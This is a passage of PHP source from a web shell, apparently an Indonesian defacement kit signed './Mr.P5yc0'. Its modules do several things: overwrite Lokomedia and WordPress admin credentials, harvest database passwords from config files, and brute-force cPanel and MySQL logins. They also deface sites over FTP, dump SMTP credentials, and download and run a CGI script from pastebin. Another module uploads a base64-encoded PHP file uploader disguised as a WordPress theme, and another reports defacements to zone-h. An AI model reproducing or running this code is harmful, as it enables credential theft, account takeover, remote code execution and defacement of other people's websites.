					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=aqua>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='P5yc050c14l' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='P5yc050c14l' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
<br>
		";
	}
} elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=aqua>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=aqua>$ucp</font>) password (<font color=aqua>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>Succes Crack ".$i." Cpanel";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/^[client]$/", $ambil)) {
					preg_match("/password=(.*?)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					} else {
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
<br></center>";
	}
} elseif($_GET['do'] == 'cpftp_auto') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							//
						} else {
							echo "[+] username (<font color=aqua>$ucp</font>) password (<font color=aqua>$pcp</font>)<br>";
							$ftp_conn = ftp_connect($ip);
							$ftp_login = ftp_login($ftp_conn, $ucp, $pcp);
							if((!$ftp_login) || (!$ftp_conn)) {
								echo "[+] <font color=red>Login Gagal</font><br><br>";
							} else {
								echo "[+] <font color=aqua>Login Sukses</font><br>";
								$fi = htmlspecialchars($_POST['file_deface']);
								$deface = ftp_put($ftp_conn, "public_html/$fi", $_POST['deface'], FTP_BINARY);
								if($deface) {
									$i++;
									echo "[+] <font color=aqua>Deface Sukses</font><br>";
									if(function_exists('posix_getpwuid')) {
										$domain_cp = file_get_contents("/etc/named.conf");	
										if($domain_cp == '') {
											echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
										} else {
											preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
											foreach($domains_cp[1] as $dj) {
												$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
												$user_cp_url = $user_cp_url['name'];
												if($user_cp_url == $ucp) {
													echo "[+] <a href='http://$dj/$fi' target='_blank'>http://$dj/$fi</a><br><br>";
													break;
												}
											}
										}
									} else {
										echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
									}
								} else {
									echo "[-] <font color=red>Deface Gagal</font><br><br>";
								}
							}
							//echo "username (<font color=aqua>$ucp</font>) password (<font color=aqua>$pcp</font>)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>Success Deface ".$i." Cpanel by <font color=red>./Mr.P5yc0</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		Filename: <br>
		<input type='text' name='file_deface' placeholder='index.php' value='index.php' style='width: 450px;'><br>
		Deface Page: <br>
		<input type='text' name='deface' placeholder='http://www.web-yang-udah-di-deface.com/filemu.php' style='width: 450px;'><br>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/client/", $ambil)) {
					preg_match("/password=(.*)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Hajar'>
		</form>
<br></center>";
	}
} elseif($_GET['do'] == 'smtp') {
	echo "<br>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=aqua>$smtp_host</font><br>";
				echo "SMTP port: <font color=aqua>$smtp_port</font><br>";
				echo "SMTP user: <font color=aqua>$smtp_user</font><br>";
				echo "SMTP pass: <font color=aqua>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=aqua>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=aqua>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
} elseif($_GET['do'] == 'auto_wp') {
	if($_POST['hajar']) {
		$title = htmlspecialchars($_POST['new_title']);
		$pn_title = str_replace(" ", "-", $title);
		if($_POST['cek_edit'] == "Y") {
			$script = $_POST['edit_content'];
		} else {
			$script = $title;
		}
		$conf = $_POST['config_dir'];
		$scan_conf = scandir($conf);
		foreach($scan_conf as $file_conf) {
			if(!is_file("$conf/$file_conf")) continue;
			$config = file_get_contents("$conf/$file_conf");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."posts";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
				$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
				echo "<div style='margin: 5px auto;'>";
				if($target == '') {
					echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
				} else {
					echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
				}
				if(!$update OR !$conn OR !$db) {
					echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
				} else {
					echo "<font color=aqua>sukses di ganti.</font><br>";
				}
				echo "</div>";
				mysql_close($conn);
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit Title+Content WordPress</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by ./Mr.P5yc0' placeholder='New Title'><br><br>
		Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
		<span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
		<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
		</form>
<br>
		";
	}
} elseif($_GET['do'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=aqua>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='./Mr.Pyc50'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
} elseif($_GET['do'] == 'cgi') {
	$cgi_dir = mkdir('psy_cgi', 0755);
	$file_cgi = "psy_cgi/cgi.izo";
	$isi_htcgi = "AddHandler cgi-script .izo";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = file_get_contents("http://pastebin.com/raw.php?i=XTUFfJLg");
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, $cgi_script);
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
	echo "<iframe src='psy_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
} elseif($_GET['do'] == 'auto_dwp') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$scan = $_POST['link_config'];
		$link_config = scandir($scan);
		$script = htmlspecialchars($_POST['script']);
		$user = "P5yc05c014l";
		$pass = "P5yc050c14l";
		$passx = md5($pass);
		foreach($link_config as $dir_config) {
			if(!is_file("$scan/$dir_config")) continue;
			$config = file_get_contents("$scan/$dir_config");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."users";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				if($target == '') {					
					echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
				} else {
					echo "[+] $target <br>";
				}
				$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
				if(!$conn OR !$db OR !$update) {
					echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
					mysql_close($conn);
				} else {
					$site = "$target/wp-login.php";
					$site2 = "$target/wp-admin/theme-install.php?upload";
					$b1 = anucurl($site2);
					$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
					$b = lohgin($site, $site2, $user, $pass, $wp_sub);
					$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
					$upload3 = base64_decode("PD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
					$www = "m.php";
					$fp5 = fopen($www,"w");
					fputs($fp5,$upload3);
					$post2 = array(
							"_wpnonce" => "$anu2",
							"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
							"themezip" => "@$www",
							"install-theme-submit" => "Install Now",
							);
					$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
						  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
						  curl_setopt($ch, CURLOPT_POST, 1);
						  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
						  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
						  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
					      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
					$data3 = curl_exec($ch);
						  curl_close($ch);
					$y = date("Y");
					$m = date("m");
					$namafile = "id.php";
					$fpi = fopen($namafile,"w");
					fputs($fpi,$script);
					$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
						   curl_setopt($ch6, CURLOPT_POST, true);
						   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
						   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
						   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  		   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  		   curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
					$postResult = curl_exec($ch6);
						   curl_close($ch6);
					$as = "$target/k.php";
					$bs = anucurl($as);
					if(preg_match("#$script#is", $bs)) {
            	       	echo "[+] <font color='aqua'>berhasil mepes...</font><br>";
            	       	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
            	        } else {
            	        echo "[-] <font color='red'>gagal mepes...</font><br>";
            	        echo "[!!] coba aja manual: <br>";
            	        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
            	        echo "[+] username: <font color=aqua>$user</font><br>";
            	        echo "[+] password: <font color=aqua>$pass</font><br><br>";     
            	        }
            		mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface</h1>
		<form method='post'>
		<input type='text' name='link_config' size='50' height='10' value='$dir'><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by PSYCOSOCIAL' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form>
		<br>		</center>";
	}
} elseif($_GET['do'] == 'auto_dwp2') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		$script = htmlspecialchars($_POST['script']);
		$user = "P5yc050c14l";
		$pass = "P5yc050c14l";
		$passx = md5($pass);
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
			$dbhost = ambilkata($config,"DB_HOST', '","'");
			$dbuser = ambilkata($config,"DB_USER', '","'");
			$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
			$dbname = ambilkata($config,"DB_NAME', '","'");
			$dbprefix = ambilkata($config,"table_prefix  = '","'");
			$prefix = $dbprefix."users";
			$option = $dbprefix."options";
			$conn = mysql_connect($dbhost,$dbuser,$dbpass);
			$db = mysql_select_db($dbname);
			$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
			$result = mysql_fetch_array($q);
			$id = $result[ID];
			$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
			$result2 = mysql_fetch_array($q2);
			$target = $result2[option_value];
			if($target == '') {					
				echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
			} else {
				echo "[+] $target <br>";
			}
			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
			if(!$conn OR !$db OR !$update) {
				echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
				mysql_close($conn);
			} else {
				$site = "$target/wp-login.php";
				$site2 = "$target/wp-admin/theme-install.php?upload";
				$b1 = anucurl($site2);
				$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
				$b = lohgin($site, $site2, $user, $pass, $wp_sub);
				$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
				$upload3 = base64_decode("PD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
				$www = "m.php";
				$fp5 = fopen($www,"w");
				fputs($fp5,$upload3);
				$post2 = array(
						"_wpnonce" => "$anu2",
						"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
						"themezip" => "@$www",
						"install-theme-submit" => "Install Now",
						);
				$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
					  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
					  curl_setopt($ch, CURLOPT_POST, 1);
					  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
					  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
					  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
				$data3 = curl_exec($ch);
					  curl_close($ch);
				$y = date("Y");
				$m = date("m");
				$namafile = "id.php";
				$fpi = fopen($namafile,"w");
				fputs($fpi,$script);
				$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
					   curl_setopt($ch6, CURLOPT_POST, true);
					   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
					   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
					   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  	   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		 	   curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
				$postResult = curl_exec($ch6);
					   curl_close($ch6);
				$as = "$target/k.php";
				$bs = anucurl($as);
				if(preg_match("#$script#is", $bs)) {
                   	echo "[+] <font color='aqua'>berhasil mepes...</font><br>";
                   	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
                    } else {
                    echo "[-] <font color='red'>gagal mepes...</font><br>";
                    echo "[!!] coba aja manual: <br>";
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
